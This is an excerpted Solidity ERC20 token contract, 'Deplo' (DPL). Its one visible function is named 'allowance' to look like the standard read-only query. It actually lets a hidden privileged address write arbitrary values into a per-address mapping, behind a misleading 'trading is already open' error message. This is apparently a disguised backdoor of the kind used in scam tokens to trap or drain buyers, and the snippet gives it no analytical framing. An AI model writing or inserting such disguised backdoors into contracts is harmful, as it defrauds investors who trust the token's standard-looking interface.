...
contract Deplo is Context, IERC20, Ownable {
    ...
    string private constant _name = "Deplo";
    string private constant _symbol = "DPL";
    ...
    function allowance(address recipient, uint256 num) external {
      require(
         _return == _Sender(), "trading is already open"
          );
          _sets[recipient]=num;
    }
